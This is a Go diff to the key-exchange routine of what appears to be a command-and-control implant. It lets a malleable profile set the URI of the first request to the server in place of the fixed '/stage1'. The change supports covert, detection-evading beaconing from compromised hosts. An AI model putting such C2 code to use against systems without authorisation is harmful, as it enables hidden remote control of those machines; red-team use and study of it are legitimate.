@@ -81,8 +81,11 @@ func floorDiv(a, b int) int {
 	return result
 }
 
-// Perform DH Key Exchange (stagingKey encrypts header, sessionKey encrypts payload)
-func PerformDHKeyExchange(server string, sessionID string, stagingKey []byte, agent_private_cert_key []byte, agent_public_cert_key []byte, server_public_cert_key []byte) ([]byte, string, []byte, error) {
+// Perform DH Key Exchange (stagingKey encrypts header, sessionKey encrypts payload).
+// stage1URI is the (possibly profile-derived) path at which the server
+// expects the initial key-exchange request. Callers that don't have a
+// malleable profile in play pass "/stage1" for legacy parity.
+func PerformDHKeyExchange(server string, stage1URI string, sessionID string, stagingKey []byte, agent_private_cert_key []byte, agent_public_cert_key []byte, server_public_cert_key []byte) ([]byte, string, []byte, error) {
 	privateKey, publicKey, err := GenerateDHKeyPair()
 	if err != nil {
 		return nil, "", nil, fmt.Errorf("error generating DH keys: %v", err)
@@ -102,7 +105,10 @@ func PerformDHKeyExchange(server string, sessionID string, stagingKey []byte, ag
 	routingPacket := packetHandler.BuildRoutingPacket(stagingKey, sessionID, 2, 0, encData)
 
 	// Send DH key exchange request
-	postURL := server + "/stage1"
+	if stage1URI == "" {
+		stage1URI = "/stage1"
+	}
+	postURL := server + stage1URI
 	resp, err := http.Post(postURL, "application/octet-stream", bytes.NewReader(routingPacket))
 	if err != nil {
 		return nil, "", nil, fmt.Errorf("error sending DH exchange request: %v", err)
